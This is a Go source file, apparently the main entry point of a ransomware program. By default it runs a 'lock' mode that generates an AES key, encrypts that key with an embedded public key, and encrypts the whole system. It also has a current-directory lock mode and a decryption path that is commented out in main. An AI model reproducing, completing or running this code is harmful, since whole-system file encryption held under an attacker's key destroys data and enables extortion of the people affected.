package main

import (
	_ "embed"
	"fmt"
	"os"

	enc "frostbite.com/encryption"
	"frostbite.com/tools/file"
	"frostbite.com/tools/system"
)

func ErrCheck(err error) {
	if err != nil {
		panic(err)
	}
}

//go:embed keys/public.key
var pubKeyVar []byte

var pl = fmt.Println

var (
	Mode            string = "lock"
	encryptedAESKey []byte
)

func main() {

	switch Mode {
	case "decrypt":
		// ModeDecrypt()
	case "lock":
		ModeLockSystem()
	default:
		ModeLockCurrentDir()
	}
}

func SetModeOfOperation() {
	filesThatAlterMode := make(map[string]string)
	filesThatAlterMode["decrypted.key"] = "decrypt"
	filesThatAlterMode["THIS MIGHT DESTROY MY COMPUTER"] = "lock"

	for file, mode := range filesThatAlterMode {
		//check if filr exists
		if _, err := os.Stat(file); err == nil {
			Mode = mode
			pl("Mode of operation set to: ", Mode)
			break
		}
	}
}

func ModeDecrypt() {
	AESKey, err := os.ReadFile("decrypted.key")
	ErrCheck(err)
	currentDir, err := os.Getwd()
	ErrCheck(err)
	file.DecryptFilesInDir(currentDir, true, AESKey)
}

func ModeLockCurrentDir() {
	key, encryptedAESKey := generateAesAndEncryptedAes()

	file.RunEncryptForCurrentDir(encryptedAESKey, key)
}

func ModeLockSystem() {
	//encrypt aes key with public key
	key, encryptedAESKey := generateAesAndEncryptedAes()

	system.WholeSystemEncrypt(key, encryptedAESKey)
}

func generateAesAndEncryptedAes() ([]byte, []byte) {
	key := enc.GenerateAES()

	encryptedAESKey = enc.EncryptWithPublicKey(key, enc.BytesToPublicKey(pubKeyVar))
	return key, encryptedAESKey
}
